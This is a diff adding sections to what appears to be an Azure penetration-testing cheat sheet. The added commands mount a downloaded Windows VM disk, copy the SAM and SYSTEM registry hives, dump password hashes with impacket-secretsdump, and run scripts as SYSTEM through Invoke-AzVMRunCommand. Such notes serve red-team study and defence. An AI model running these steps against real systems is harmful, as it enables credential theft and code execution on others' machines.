@@ -15,6 +15,40 @@
 ### Read password hashes from virtual machine
 - Download the disk https://docs.microsoft.com/en-us/azure/virtual-machines/windows/download-vhd#generate-download-url
 
+#### Check the disks
+```
+sudo fdisk –l
+```
+
+#### Mount the disk
+```
+sudo mkdir /media/mounted-drive
+sudo mount /dev/sdc4 /media/mounted-drive/
+```
+
+#### Navigate to the windows snapshot
+```
+cd /media/mounted-drive/
+ls
+```
+
+#### Copy system/SAM and dump hashes
+```
+cd /media/mounted-drive/Windows/System32/config/
+cp SAM SYSTEM ~/
+cd ~/
+impacket-secretsdump -system SYSTEM -sam SAM LOCAL
+```
+
+### Execute commands
+- Requires the "Virtual Machine Contributor" role
+- Run as default by SYSTEM or root
+- Commandid =  RunPowerShellScript or RunShellScript
+
+```
+Invoke-AzVMRunCommand -ResourceGroupName <resource group name> -VMName <VM name> -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
+```
+
 ## Ad user attributes
 - User attributes and sensitive information
 
